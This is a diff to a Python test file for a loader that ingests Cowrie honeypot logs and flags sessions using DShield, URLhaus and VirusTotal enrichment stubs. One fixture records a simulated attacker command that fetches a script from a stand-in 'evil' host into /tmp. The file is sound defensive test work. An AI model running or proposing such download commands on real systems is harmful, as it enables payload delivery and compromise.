@@ -4,8 +4,10 @@ from __future__ import annotations
 
 import json
 from pathlib import Path
+from typing import Any, Dict
 
 from sqlalchemy import func, select
+from sqlalchemy.orm import sessionmaker
 
 from cowrieprocessor.db import RawEvent, SessionSummary, apply_migrations, create_engine_from_settings
 from cowrieprocessor.loader import BulkLoader, BulkLoaderConfig, LoaderCheckpoint
@@ -35,12 +37,14 @@ def test_bulk_loader_inserts_raw_events(tmp_path):
             "eventid": "cowrie.session.connect",
             "timestamp": "2024-01-01T00:00:00Z",
             "src_ip": "1.2.3.4",
+            "sensor": "sensor-a",
         },
         {
             "session": "abc123",
             "eventid": "cowrie.command.input",
             "timestamp": "2024-01-01T00:01:00Z",
             "input": "wget http://evil /tmp/run.sh",
+            "sensor": "sensor-a",
         },
     ]
     source = tmp_path / "events.json"
@@ -71,6 +75,9 @@ def test_bulk_loader_inserts_raw_events(tmp_path):
         assert summary.event_count == 2
         assert summary.command_count == 1
         assert summary.source_files
+        assert summary.vt_flagged == 0
+        assert summary.dshield_flagged == 0
+        assert summary.matcher == "sensor-a"
 
 
 def test_bulk_loader_is_idempotent(tmp_path):
@@ -198,11 +205,89 @@ def test_bulk_loader_mixed_json_formats(tmp_path):
     assert metrics.events_inserted == 2
     assert metrics.events_read == 2
 
+
+class DummyEnrichment:
+    """Simple in-memory enrichment stub returning flagged metadata."""
+
+    def __init__(self) -> None:
+        """Initialise call tracking containers for the dummy service."""
+        self.session_calls: list[tuple[str, str]] = []
+        self.file_calls: list[str] = []
+
+    def enrich_session(self, session_id: str, src_ip: str) -> Dict[str, Any]:
+        """Return canned session enrichment payload and record invocation."""
+        self.session_calls.append((session_id, src_ip))
+        return {
+            "session_id": session_id,
+            "src_ip": src_ip,
+            "enrichment": {
+                "dshield": {"ip": {"count": "5", "attacks": "10"}},
+                "urlhaus": "malware,botnet",
+                "spur": ["", "", "", "DATACENTER"],
+            },
+        }
+
+    def enrich_file(self, file_hash: str, filename: str) -> Dict[str, Any]:
+        """Return canned VirusTotal enrichment payload and record invocation."""
+        self.file_calls.append(file_hash)
+        return {
+            "file_hash": file_hash,
+            "filename": filename,
+            "enrichment": {
+                "virustotal": {
+                    "data": {
+                        "attributes": {
+                            "last_analysis_stats": {"malicious": 3},
+                        }
+                    }
+                }
+            },
+        }
+
+
+def test_bulk_loader_sets_enrichment_flags(tmp_path):
+    """Loader should populate summary flags when enrichment service is provided."""
+    events = [
+        {
+            "session": "enrich1",
+            "eventid": "cowrie.session.connect",
+            "timestamp": "2024-03-01T00:00:00Z",
+            "src_ip": "203.0.113.10",
+            "sensor": "sensor-enrich",
+        },
+        {
+            "session": "enrich1",
+            "eventid": "cowrie.session.file_download",
+            "timestamp": "2024-03-01T00:01:00Z",
+            "shasum": "deadbeef",
+            "src_ip": "203.0.113.10",
+            "sensor": "sensor-enrich",
+        },
+    ]
+    source = tmp_path / "enrich.json"
+    _write_events(source, events)
+
+    engine = _make_engine(tmp_path)
+    service = DummyEnrichment()
+    loader = BulkLoader(engine, BulkLoaderConfig(batch_size=10), enrichment_service=service)
+    loader.load_paths([source])
+
+    assert service.session_calls == [("enrich1", "203.0.113.10")]
+    assert service.file_calls == ["deadbeef"]
+
+    Session = sessionmaker(bind=engine, future=True)
+    with Session() as db_session:
+        summary = db_session.query(SessionSummary).filter(SessionSummary.session_id == "enrich1").one()
+        assert summary.vt_flagged == 1
+        assert summary.dshield_flagged == 1
+        assert summary.command_count == 0
+        assert summary.matcher == "sensor-enrich"
+
     with engine.connect() as conn:
         payloads = list(conn.execute(select(RawEvent.payload)).all())
         assert len(payloads) == 2
         sessions = {payload[0]["session"] for payload in payloads}
-        assert sessions == {"single123", "multi123"}
+        assert sessions == {"enrich1"}
 
 
 def test_bulk_loader_multiline_json_malformed_limit(tmp_path):
